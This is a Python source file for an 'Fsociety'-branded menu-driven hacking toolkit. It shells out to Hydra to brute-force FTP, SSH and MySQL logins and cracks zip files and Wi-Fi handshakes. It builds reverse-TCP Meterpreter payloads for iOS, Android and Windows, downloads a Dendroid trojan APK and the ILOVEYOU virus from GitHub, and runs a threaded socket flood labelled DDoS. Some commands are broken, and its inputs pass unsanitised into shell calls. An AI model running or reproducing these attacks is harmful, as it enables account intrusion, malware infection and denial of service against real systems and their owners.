import os
import sys
import time
import socket
import threading
import requests
import mechanize
os.system("clear")


logo = ("""

 ╭━━━┳━━━┳━━━┳━━━┳━━┳━━━┳━━━━┳╮╱╱╭╮
 ┃╭━━┫╭━╮┃╭━╮┃╭━╮┣┫┣┫╭━━┫╭╮╭╮┃╰╮╭╯┃
 ┃╰━━┫╰━━┫┃╱┃┃┃╱╰╯┃┃┃╰━━╋╯┃┃╰┻╮╰╯╭╯
 ┃╭━━┻━━╮┃┃╱┃┃┃╱╭╮┃┃┃╭━━╯╱┃┃╱╱╰╮╭╯
 ┃┃╱╱┃╰━╯┃╰━╯┃╰━╯┣┫┣┫╰━━╮╱┃┃╱╱╱┃┃
 ╰╯╱╱╰━━━┻━━━┻━━━┻━━┻━━━╯╱╰╯╱╱╱╰╯
[+]     FUCK SOCIETY IDIOTS      [+]
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
[+] Creator        : L00p Th3 L00p
[+] Script Version : 0.1
[+] Status         : Online
[+] System         : Wi-Fi
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""")

def tool_main_function():
             os.system("clear")
             print(logo)
             print ("[01] Password Tools    ")
             print ("[02] Exploitation Tools")
             print ("[03] Website Tools     ")
             print ("[00] Exit Program      ")
             a =input("Fsociety : ")
             if a =="":
                tool_main_function()
             elif a =="1":
                  passwordtools()
             elif a =="2":
                  exploitationtools()
             elif a =="3":
                  websitetools()
             elif a =="0":
                  exit()
             else:
                 print ("[!] ERROR INVALID NUMBER")
                 tool_main_function()

def passwordtools():
             os.system("clear")
             print(logo)
             print ("[01] Crack Zip File [With Hash]")
             print ("[02] Crack Zip File [Without Hash]")
             print ("[03] Crack FTP Server [Hydra]")
             print ("[04] Crack SSH Server [Hydra]")
             print ("[05] Crack Mysql Server [HYDRA]")
             print ("[06] Crack Hccapx or Cap File [Aircrack-ng]")
             print ("[07] Generate Password List [Crunch]")
             print ("[00] Main Menu")
             b =input("Fsociety : ")
             if b =="":
                passwordtools()
             elif b =="1":
                  ziphash()
             elif b =="2":
                  zipcrack()
             elif b =="3":
                  ftpcrack()
             elif b =="4":
                  sshcrack()
             elif b =="5":
                  mysqlcrack()
             elif b =="6":
                  hccapxcrack()
             elif b =="7":
                  crunch()
             elif b =="0":
                  tool_main_function()
             else:
                 passwordtools()

def ziphash():
       os.system("clear")
       print(logo)
       print ("To get the zip hash run zip2john [zipname] > hash.txt")
       print ("")
       hash =input("Enter Hash Name Or Path : ")
       wordlist =input("Enter Wordlist Path : ")
       os.system (f"john --wordlist={wordlist} {hash}")
       input("Back")
       passwordtools()

def zipcrack():
       os.system("clear")
       print(logo)
       zip =input("Zip File Name Or Path : ")
       wordlist =input("Password list : ")
       os.system(f"fcrackzip -u -D -p {wordlist} {zip}")
       input("Back")
       passwordtools()

def ftpcrack():
       os.system("clear")
       print(logo)
       link =input("FTP Server Url [0.0.0.0:8000] : ")
       userlist =input("Username List : ")
       passlist =input("Password List : ")
       os.system("hydra -l {userlist} -P {passlist} ftp://{link}")
       input("Back")
       passwordtools()

def sshcrack():
       os.system("clear")
       print(logo)
       link =input("SSH Server Link [192.168.0.0] : ")
       userlist =input("Username List : ")
       passlist =input("Password List : ")
       os.system("hydra -l {userlist} -P {passlist} ssh://{link}")
       input("Back")
       passwordtools()

def mysqlcrack():
       os.system("clear")
       print(logo)
       sqlurl =input("Server Url : ")
       userlist =input("Username List : ")
       passlist =input("Password List : ")
       os.system(f"hydra -l  {userlist} -P {passlist} mysql://{sqlurl}")
       input("Back")
       passwordtools()

def hccapxcrack():
       os.system("clear")
       print(logo)
       hccapxfile =input("Hccapx File Name Or Path : ")
       passlist =input("Password List : ")
       os.system(f"aircrack-ng -w {passlist} {hccapxfile}")
       print ("")
       print ("[+] Process Successfully Finished")
       input("Back")
       passwordtools()

def crunch():
       os.system("clear")
       print(logo)
       min =input("Enter the minimum length of the password (0/129): ")
       max =input("Enter the maximum length of password (0/129) : ")
       contains =input("Enter Contains To Password List : ")
       os.system(f"crunch {min} {max} {contains} > pass.txt")
       print ("Process Has Been Finished File Name : pass.txt")
       input("Back")
       passwordtools()

def exploitationtools():
       os.system("clear")
       print(logo)
       print ("[+] Reverse TCP Attack Section")
       print ("[01] Create A Payload [Apple_IOS]")
       print ("[02] Create A Payload [Android]")
       print ("[03] Create A Payload [Windows]")
       print ("")
       print ("[+] Malware, Trojan Attack Section")
       print ("[04] Trojan Attack [ANDROID]")
       print ("[05] ILOVEYOU VIRUS 2000 [Windows]")
       print ("[00] Main Menu")
       c =input("Fsociety : ")
       if c =="":
          exploitationtools()
       elif c =="1":
            iospayload()
       elif c =="2":
            androidpayload()
       elif c =="3":
            windowspayload()
       elif c =="4":
            androidvirus()
       elif c =="5":
            lovebug()
       elif c =="0":
            tool_main_function()
       else:
           exploitationtools()

def iospayload():
       os.system("clear")
       print(logo)
       LHOST =input("Enter LHOST : ")
       LPORT =input("Enter LPORT : ")
       name =input("Enter Your Own Payload Name : ")
       print ("[+] Creating Payload This May Take A While")
       os.system(f"msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={LHOST} lport={LPORT} -f macho -o {name}")
       print ("[+] Operation Successfully Finished")
       input("back")
       exploitationtools()

def androidpayload():
       os.system("clear")
       print(logo)
       LHOST =input("Enter LHOST : ")
       LPORT =input("Enter LPORT : ")
       name =input("Enter Your Own Payload Name : ")
       print ("[+] Creating Payload This May Take A While")
       os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={LHOST} lport={LPORT} R > {name}.apk")
       print ("[+] Operation Successfully Finished")
       input("back")
       exploitationtools()

def windowspayload():
       os.system("clear")
       print(logo)
       LHOST =input("Enter LHOST : ")
       LPORT =input("Enter LPORT : ")
       name =input("Enter Your Own Payload Name : ")
       os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o {name}.exe")
       print ("Operation Successfully Finished")
       input("Back")
       exploitationtools()

def androidvirus():
       os.system("clear")
       print(logo)
       os.system("wget https://github.com/LOoLzeC/vcrt/raw/master/dendroid.apk")
       print ("Operation Successfully Finished")
       input("Back")
       exploitationtools()

def lovebug():
       os.system("clear")
       print(logo)
       os.system("wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/ILOVEYOU.vbs")
       print ("Operation Successfully Finished")
       input("Back")
       exploitationtools()

def websitetools():
       os.system("clear")
       print(logo)
       print ("[01] Check Website Port")
       print ("[02] Ping Website")
       print ("[03] Distributed Denial Of Service")
       print ("[00] Main Menu")
       d =input("Fsociety : ")
       if d =="":
          websitetools()
       elif d =="1":
            checkport()
       elif d =="2":
            pingweb()
       elif d =="3":
            ddosattack()
       elif d =="0":
            tool_main_function()
       else:
           websitetools()

def checkport():
       os.system("clear")
       print(logo)
       name =input("Enter Website Url : ")
       os.system(f"nmap {name} --unprivileged")
       input("Back")
       websitetools()

def pingweb():
       os.system("clear")
       print(logo)
       name =input("Enter Website Url Or IP : ")
       os.system(f"ping {name}")
       input("Back")
       websitetools()

def ddosattack():
       os.system("clear")
       print(logo)
       target = str(input("Insert target's IP: "))
       port = int(input("Insert Port: "))
       Trd = int(input("Insert number of Threads: "))
       fake_ip = '44.197.175.168'

       attack_num = 1

       def attack():
           global attack_num
           while True:
               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               s.connect((target, port))
               s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
               s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
               s.close()
               global attack_num
               attack_num = 999999
               print(f"Sent {attack_num} Packets To {target} Through Port : {port}")

       for i in range(Trd):
           thread = threading.Thread(target=attack)
           thread.start()

tool_main_function()
